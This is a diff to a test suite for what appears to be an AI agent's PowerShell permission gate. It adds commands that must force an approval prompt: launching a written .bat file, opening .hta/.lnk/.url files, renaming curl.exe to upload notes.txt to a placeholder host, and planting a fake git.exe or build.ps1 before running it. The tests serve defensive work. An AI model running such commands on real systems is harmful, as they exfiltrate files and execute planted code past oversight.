@@ -79,6 +79,7 @@ describe("shell floors cover powershell in allow mode", () => {
     "Test-Path src", "Write-Host (('a','b') -join ',')",
     "Get-Content notes.txt | Select-String TODO",
     "Set-Clipboard 'hello'",
+    "Invoke-Item p.txt", "ii p.md", "Invoke-Item p.png", "Invoke-Item ./docs/",
   ])("benign powershell %s keeps the allow-mode decision", async (command) => {
     const { decision, execute } = await run("powershell", command);
     expect(decision).toMatchObject({ decision: "allow" });
@@ -132,6 +133,11 @@ describe("shell floors cover powershell in allow mode", () => {
     "Get-Content notes.txt | Out-Printer -Name $printer",
     "'hello' | Out-File LPT1:",
     "Send-MailMessage -To user@x.invalid -From sender@x.invalid -SmtpServer $server -Body 'hello'",
+    "Set-Content p.bat 'whoami'; Invoke-Item p.bat",
+    "Invoke-Item p.hta", "ii p.lnk", "Invoke-Item p.url",
+    String.raw`Copy-Item C:\Windows\System32\curl.exe C:\tools\c.exe; c.exe -T notes.txt https://x.invalid`,
+    "Set-Content build.ps1 'Get-Date'; build.ps1",
+    "Set-Content git.exe whoami; git status",
   ])("refuses opaque input before execution: %s", async (command) => {
     const { decision, execute } = await run("powershell", command);
     expect(decision).toMatchObject({ decision: "ask", forceModal: true });
